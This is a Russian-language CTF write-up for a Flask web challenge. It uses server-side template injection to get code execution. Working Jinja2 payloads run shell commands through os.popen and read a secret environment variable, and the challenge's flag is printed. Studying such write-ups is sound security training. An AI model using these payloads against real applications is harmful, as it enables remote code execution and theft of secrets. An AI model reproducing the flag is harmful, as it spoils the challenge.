# Shift-Left, Brain-Right

> **Категория:** DevSecOps / Web · **Событие:** KubSTU CTF 2026 Autumn · **Сложность:** Medium

## 📌 Задача

Как же достали эти вайбкодеры с зарплатой 500.000$ в наносекунду... Нанали тут одного Intern разработчика. Он нам сайт с курсами сделал. Мало того, что сайт с нерабочим функционалом, так он еще и спорит, что все шикарно. Я его просканировал SAST'ом, там одна уязвимость интересная. Проэксплуатируй-ка ее, вместе потом смеяться будем :)

Формат флага: KubCTF{...}

**Файлы:** [app.py](../../../assets/Web/Shift-Left,%20Brain-Right/app.py) · [Dockerfile](../../../assets/Web/Shift-Left,%20Brain-Right/Dockerfile) · [report.json](../../../assets/Web/Shift-Left,%20Brain-Right/report.json)

## 🏁 Решение

### 1. Чтение отчёта

В отчёте видим строчку: `This is highly susceptible to Server-Side Template Injection (SSTI) and Cross-Site Scripting (XSS).`
Пробуем SSTI.

### 2. Подтверждение SSTI

```
GET /?course={{7*7}}
```

В блоке результата возвращается `49` — движок исполнил выражение.

### 3. RCE через контекст Flask

Объект `config` доступен в шаблоне, через `__class__.__init__.__globals__` выходим в глобалы модуля и достаём `os`:

```
GET /?course={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Ответ: `uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)` — RCE есть.

### 4. Чтение флага

Флаг проброшен платформой GZCTF в переменную окружения `GZCTF_FLAG`:

```
GET /?course={{config.__class__.__init__.__globals__['os'].environ['GZCTF_FLAG']}}
```

получаем ответ: `KubSTU{S46t_1s_C00l_TestTeamHash}`

**Флаг:** `KubSTU{S46t_1s_C00l_TestTeamHash}`
